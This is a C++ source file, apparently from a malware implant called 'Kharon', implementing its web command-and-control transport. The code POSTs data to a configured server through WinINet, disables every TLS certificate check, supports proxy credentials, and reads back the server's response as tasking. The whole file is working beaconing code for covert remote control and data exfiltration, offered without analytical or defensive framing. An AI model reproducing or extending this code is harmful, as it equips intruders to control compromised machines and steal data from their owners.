#include <Kharon.h>

using namespace Root;

#if PROFILE_C2 == PROFILE_WEB
auto DECLFN Transport::WebSend(
    _In_      PVOID   Data,
    _In_      UINT64  Size,
    _Out_opt_ PVOID  *RecvData,
    _Out_opt_ UINT64 *RecvSize
) -> BOOL {
    HANDLE hSession = NULL;
    HANDLE hConnect = NULL;
    HANDLE hRequest = NULL;

    ULONG  HttpAccessType  = 0;
    ULONG  HttpFlags       = 0;
    ULONG  OptFlags        = 0;

    BOOL   Success = FALSE;

    PVOID  TmpBuffer     = NULL;
    PVOID  RespBuffer    = NULL;
    SIZE_T RespSize      = 0;
    SIZE_T RespCapacity  = 0;  
    DWORD  BytesRead     = 0;
    UINT32 ContentLength = 0;
    ULONG  ContentLenLen = sizeof(ContentLength);

    ULONG HttpStatusCode = 0;
    ULONG HttpStatusSize = sizeof(HttpStatusCode);

    if (RecvData) *RecvData = NULL;
    if (RecvSize) *RecvSize = 0;

    HttpFlags = INTERNET_FLAG_RELOAD;

    if (Self->Tsp->Web.ProxyEnabled) HttpAccessType = INTERNET_OPEN_TYPE_PROXY;

    hSession = Self->Wininet.InternetOpenW(   
        Self->Tsp->Web.UserAgent, HttpAccessType,
        Self->Tsp->Web.ProxyUrl, 0, 0
    );
    if (!hSession) { KhDbg("last error: %d", KhGetError); goto _KH_END; }

    hConnect = Self->Wininet.InternetConnectW(
        hSession, Self->Tsp->Web.Host, Self->Tsp->Web.Port,
        Self->Tsp->Web.ProxyUsername, Self->Tsp->Web.ProxyPassword,
        INTERNET_SERVICE_HTTP, 0, 0
    );
    if (!hConnect) { KhDbg("last error: %d", KhGetError); goto _KH_END; }

    if (Self->Tsp->Web.Secure) {
        HttpFlags |= INTERNET_FLAG_SECURE;
        OptFlags   = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                   SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                   SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                   SECURITY_FLAG_IGNORE_WRONG_USAGE |
                   SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
    }        

    hRequest = Self->Wininet.HttpOpenRequestW( 
        hConnect, L"POST", Self->Tsp->Web.EndPoint, NULL, 
        NULL, NULL, HttpFlags, 0 
    );
    if (!hRequest) { KhDbg("last error: %d", KhGetError); goto _KH_END; }

    Self->Wininet.InternetSetOptionW(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &OptFlags, sizeof(OptFlags));

    Success = Self->Wininet.HttpSendRequestW(
        hRequest, Self->Tsp->Web.HttpHeaders,
        Str::LengthW(Self->Tsp->Web.HttpHeaders),
        Data, Size
    );
    if (!Success) { KhDbg("last error: %d", KhGetError); goto _KH_END; }

    Self->Wininet.HttpQueryInfoW(
        hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
        &HttpStatusCode, &HttpStatusSize, NULL
    );

    KhDbg("http status code %d", HttpStatusCode);

    if (HttpStatusCode >= 200 && HttpStatusCode < 300) {
        Success = Self->Wininet.HttpQueryInfoW(
            hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER,
            &ContentLength, &ContentLenLen, NULL
        );

        if (Success) {
            RespSize = ContentLength;
            if (RespSize > 0) {
                RespBuffer = PTR(Self->Hp->Alloc(RespSize + 1)); // +1 para null terminator
                if (!RespBuffer) { 
                    KhDbg("Failed to allocate response buffer");
                    goto _KH_END;
                }

                Self->Wininet.InternetReadFile(hRequest, RespBuffer, RespSize, &BytesRead);
                if (BytesRead != RespSize) {
                    KhDbg("Read %d bytes, expected %zu", BytesRead, RespSize);
                    Self->Hp->Free(RespBuffer);
                    RespBuffer = NULL;
                    goto _KH_END;
                }
            }
        } else {
            if (KhGetError == ERROR_HTTP_HEADER_NOT_FOUND) {
                KhDbg("content-length header not found");
            } else {
                KhDbg("last error: %d", KhGetError);
            }

            TmpBuffer = PTR(Self->Hp->Alloc(BEG_BUFFER_LENGTH));
            if (!TmpBuffer) {
                KhDbg("Failed to allocate temporary buffer");
                goto _KH_END;
            }

            const SIZE_T MAX_RESPONSE_SIZE = 10 * 1024 * 1024; // 10MB limite
            RespCapacity = BEG_BUFFER_LENGTH;
            RespBuffer = PTR(Self->Hp->Alloc(RespCapacity));
            if (!RespBuffer) {
                KhDbg("Failed to allocate initial response buffer");
                goto _KH_END;
            }

            do {
                Success = Self->Wininet.InternetReadFile(hRequest, TmpBuffer, BEG_BUFFER_LENGTH, &BytesRead);
                if (!Success || BytesRead == 0) break;

                if ((RespSize + BytesRead) > RespCapacity) {
                    SIZE_T newCapacity = max(RespCapacity * 2, RespSize + BytesRead);
                    if (newCapacity > MAX_RESPONSE_SIZE) {
                        KhDbg("Response too large");
                        break;
                    }

                    PVOID newBuffer = PTR(Self->Hp->ReAlloc(RespBuffer, newCapacity));
                    if (!newBuffer) {
                        KhDbg("Failed to reallocate response buffer");
                        break;
                    }
                    RespBuffer = newBuffer;
                    RespCapacity = newCapacity;
                }

                Mem::Copy(PTR(U_PTR(RespBuffer) + RespSize), TmpBuffer, BytesRead);
                RespSize += BytesRead;

            } while (BytesRead > 0);

            if (TmpBuffer) {
                Self->Hp->Free(TmpBuffer);
                TmpBuffer = NULL;
            }

            if (!Success) {
                if (RespBuffer) {
                    Self->Hp->Free(RespBuffer);
                    RespBuffer = NULL;
                    RespSize = 0;
                }
                goto _KH_END;
            }
        }

        if (RecvData) *RecvData = RespBuffer;
        if (RecvSize) *RecvSize = RespSize;
        Success = TRUE;
    } else {
        Success = FALSE;
    }

_KH_END:
    if (TmpBuffer) Self->Hp->Free(TmpBuffer);
    if (hRequest) Self->Wininet.InternetCloseHandle(hRequest);
    if (hConnect) Self->Wininet.InternetCloseHandle(hConnect);
    if (hSession) Self->Wininet.InternetCloseHandle(hSession);

    if (!Success && RespBuffer) {
        Self->Hp->Free(RespBuffer);
        if (RecvData) *RecvData = NULL;
        if (RecvSize) *RecvSize = 0;
    }

    return Success;
}
#endif
